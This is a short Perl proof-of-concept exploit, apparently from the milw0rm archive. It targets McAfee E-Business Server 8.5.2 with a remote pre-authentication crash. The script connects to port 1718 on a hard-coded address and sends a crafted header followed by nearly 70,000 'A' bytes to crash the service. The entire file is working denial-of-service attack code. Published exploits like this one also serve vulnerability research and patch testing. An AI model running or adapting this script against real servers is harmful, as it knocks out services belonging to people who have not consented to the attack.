#!/usr/bin/perl
#
#
# McAfee(R) E-Business Server(TM) 8.5.2 Remote preauth crash (PoC)
#
# - tested on Windows and Linux
#
#
# Leon Juranic <leon.juranic@infigo.hr>, 
# Infigo IS <http://www.infigo.hr/en/>
#


use IO::Socket;

$saddr = "192.168.1.3";
$sport = 1718;

$exp1 = "\x01\x3f\x2f\x05\x25\x2a" . "A" x 69953;;

print "> Sending exploit string...\n";
my $server_sock = IO::Socket::INET->new (PeerAddr => $saddr, PeerPort => $sport) || die ("Cannot connect to server!!!\n\n");
print $server_sock $exp1;

# milw0rm.com [2008-01-09]
